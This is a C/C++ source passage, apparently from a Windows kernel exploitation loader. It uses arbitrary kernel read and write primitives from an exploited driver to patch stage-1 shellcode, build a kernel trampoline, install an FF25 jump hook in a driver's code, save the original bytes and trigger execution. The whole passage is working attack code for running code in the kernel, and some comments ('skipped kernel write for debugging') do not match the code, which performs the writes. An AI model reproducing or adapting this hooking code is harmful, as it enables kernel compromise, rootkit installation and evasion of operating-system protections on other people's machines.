	DWORD64 distance = (next_rip > trampoline_addr) ? (next_rip - trampoline_addr) : (trampoline_addr - next_rip);
	LDRLog(L"distance=0x%llX (hook_point=0x%p, next_rip=0x%llX, trampoline_addr=0x%llX)\n",
		distance, hook_point, next_rip, trampoline_addr);

	DWORD64 trampoline_pit = 0;
	if (distance > 0xFFFFFFFF) {
		LDRLog(L"distance exceeds 4GB, using DbgPrompt as PIT relay\n");
		if (!LdrCtx_GetDbgPromptAbsAddr()) {
			LDRLog(L"DbgPrompt not resolved, cannot install hook\n");
			return FALSE;
		}
		trampoline_pit = (DWORD64)LdrCtx_GetDbgPromptAbsAddr();
		LDRLog(L"write trampoline_addr to DbgPrompt PIT at 0x%llX\n", trampoline_pit);
	}
	else {
		trampoline_pit = (DWORD64)tramp_base + stage_2_func_offset + TRAMPOLINE_PIT_OFFSET_STAGE_2_FUNC;
		LDRLog(L"write trampoline_addr to PIT at 0x%llX\n", trampoline_pit);
	}

	// Write trampoline_addr to PIT
	if (!g_kpTable->WritePrimitive((PVOID)trampoline_pit, (void*)(&trampoline_addr), sizeof(DWORD64))) {
		LDRLog(L"failed to write trampoline_addr to PIT at 0x%llX\n", trampoline_pit);
		return FALSE;
	}
	LDRLog(L"wrote trampoline_addr=0x%llX to PIT at 0x%llX\n", trampoline_addr, trampoline_pit);

// Construct kernel trampoline
	DWORD ori_asm_code_len = 0;
	if (!HookCore::ConstructKernelTrampolineX64_Wrapper(
		LdrCtx_GetInterface(), hook_point, target_base,
		tramp_base, stage_1_func_offset, stage_2_func_offset,
		hook_code_addr, &ori_asm_code_len)) {
		LDRLog(L"failed to call HookCore::ConstructKernelTrampolineX64_Wrapper\n");
		return FALSE;
	}
	LDRLog(L"trampoline constructed, ori_asm_code_len=%u\n", ori_asm_code_len);

	// Patch stage_1: insert "mov rcx, <evbda_mem_value>" over the nop bytes before ff25
	// Layout: 4 nop bytes at 0x19, ff25 jmp at 0x1D
	// Write 10-byte "mov rcx, imm64" starting at 0x19, covering the 4 nops and
	// overwriting the first 6 bytes of ff25. Then rewrite ff25 at 0x23.
	{
		const DWORD NOP_OFFSET = 0x19;           // 4 nop bytes before ff25
		const DWORD STAGE_1_FF25_OFFSET = 0x1D; // original ff25 jmp offset
		const DWORD MOV_RCX_IMM64_SIZE = 10;    // 48 B9 <8 bytes>
		const DWORD NEW_FF25_OFFSET = NOP_OFFSET + MOV_RCX_IMM64_SIZE; // 0x23

		DWORD64 shellcode_base = trampoline_addr;
		DWORD read_size = 0x120;
		UCHAR* buf = (UCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, read_size);
		if (!g_kpTable->ReadPrimitive((PVOID)shellcode_base, buf, read_size)) {
			LDRLog(L"failed to read stage_1 shellcode for patching\n");
			HeapFree(GetProcessHeap(), 0, buf);
			return FALSE;
		}

		// Verify nop + ff25 signature at expected offsets
		for (DWORD i = NOP_OFFSET; i < STAGE_1_FF25_OFFSET; i++) {
			if (buf[i] != 0x90) {
				LDRLog(L"warning: expected nop at offset 0x%x, found 0x%02x\n", i, buf[i]);
			}
		}
		if (buf[STAGE_1_FF25_OFFSET] != 0xFF || buf[STAGE_1_FF25_OFFSET + 1] != 0x25) {
			LDRLog(L"warning: expected ff25 at offset 0x%x, found 0x%02x 0x%02x\n",
				STAGE_1_FF25_OFFSET, buf[STAGE_1_FF25_OFFSET], buf[STAGE_1_FF25_OFFSET + 1]);
			HeapFree(GetProcessHeap(), 0, buf);
			return FALSE;
		}

		// Read original ff25 rel32
		DWORD orig_rel32 = *(DWORD*)(buf + STAGE_1_FF25_OFFSET + 2);

		// Write "mov rcx, evbda_mem_value" at the nop offset (0x19)
		buf[NOP_OFFSET + 0] = 0x48;
		buf[NOP_OFFSET + 1] = 0xB9;
		*(DWORD64*)(buf + NOP_OFFSET + 2) = evbda_mem_value;

		// Rewrite ff25 jmp at new offset (0x23), adjust rel32 for 6-byte shift
		buf[NEW_FF25_OFFSET + 0] = 0xFF;
		buf[NEW_FF25_OFFSET + 1] = 0x25;
		*(DWORD*)(buf + NEW_FF25_OFFSET + 2) = orig_rel32 - (NEW_FF25_OFFSET - STAGE_1_FF25_OFFSET);

		// Fix PIT return address: the indirect jmp at shellcode+0x8D originally
		// pointed to shellcode+0x23 (nop area before restore regs), but after patching
		// shellcode+0x23 is the new ff25 jmp. Update it to point to the restore regs
		// entry at shellcode+0x32 (pop r15 etc.)
		const DWORD STAGE_1_PIT_RET_OFFSET = 0x8D;
		const DWORD RESTORE_REGS_OFFSET = 0x32;
		DWORD64* pit_ret_ptr = (DWORD64*)(buf + STAGE_1_PIT_RET_OFFSET);
		DWORD64 orig_ret_addr = *pit_ret_ptr;
		DWORD64 orig_ret_offset = orig_ret_addr - shellcode_base;
		*pit_ret_ptr = shellcode_base + RESTORE_REGS_OFFSET;
		LDRLog(L"patched PIT return: 0x%llX (offset 0x%llx) -> 0x%llX (offset 0x%x)\n",
			orig_ret_addr, orig_ret_offset, shellcode_base + RESTORE_REGS_OFFSET, RESTORE_REGS_OFFSET);

		// Write back the patched shellcode
		if (!g_kpTable->WritePrimitive((PVOID)shellcode_base, buf, read_size)) {
			LDRLog(L"failed to write patched stage_1 shellcode\n");
			HeapFree(GetProcessHeap(), 0, buf);
			return FALSE;
		}
		LDRLog(L"patched stage_1: inserted mov rcx, 0x%llX at offset 0x%x, ff25 moved to 0x%x\n",
			evbda_mem_value, NOP_OFFSET, NEW_FF25_OFFSET);
		HeapFree(GetProcessHeap(), 0, buf);
	}
	// Read original bytes at hook_point (skipped kernel read for debugging)
	UCHAR original_ff25_bytes[ff25jmpsize] = { 0 };
	g_kpTable->ReadPrimitive(hook_point, original_ff25_bytes, ff25jmpsize);

	// Install ff25 hook (skipped kernel write for debugging)
	{
		UCHAR ff25[ff25jmpsize] = { 0xff, 0x25, 0, 0, 0, 0 };
		DWORD rel32 = (DWORD)(trampoline_pit - ((DWORD64)hook_point + ff25jmpsize));
		*(DWORD*)(ff25 + ff25_opcode_size) = rel32;
		LDRLog(L"ff25 rel32=0x%x\n", rel32);
		g_kpTable->WritePrimitive(hook_point, (void*)(ff25), ff25jmpsize);
		}
	LDRLog(L"hook installed at 0x%p -> 0x%llX (%S)\n",
		hook_point, hook_code_addr, g_exp_driver_name);

		// Write hook.save file for driverUnload to restore later
		{
			CHAR save_path[MAX_PATH] = { 0 };
			{
				WCHAR w_save[MAX_PATH] = { 0 };
				Helper::ConvertCharToWchar(HOOKSAVE_FILE, w_save, MAX_PATH);
				std::wstring w_full = Helper::GetCurrentDirFilePath((TCHAR*)w_save);
				Helper::ConvertWcharToChar(w_full.c_str(), save_path, MAX_PATH);
			}

			HANDLE hf = CreateFileA(save_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			if (hf == INVALID_HANDLE_VALUE) {
				LDRLog(L"warning: failed to create hook.save at %S (err=0x%x)\n", save_path, GetLastError());

			}
			else {
				DWORD written = 0;
				BOOL ok = TRUE;

				// Write byte count (DWORD)
				DWORD save_byte_count = ff25jmpsize;
				if (ok) ok = WriteFile(hf, &save_byte_count, sizeof(DWORD), &written, NULL) && written == sizeof(DWORD);

				// Write original bytes at hook point
				if (ok) ok = WriteFile(hf, original_ff25_bytes, save_byte_count, &written, NULL) && written == save_byte_count;

				CloseHandle(hf);

				if (ok) {
					LDRLog(L"hook.save written: %u bytes at offset 0x%x\n", save_byte_count, g_hook_point_rva);
				}
				else {
					LDRLog(L"warning: hook.save write incomplete\n");

				}
			}
		}

	// Trigger the hooked driver to execute
	if (!g_kpTable->TriggerExecute()) {
		LDRLog(L"TriggerExecute failed\n");
		return FALSE;
	}
	LDRLog(L"TriggerExecute succeeded, hook triggered\n");

	return TRUE;
}
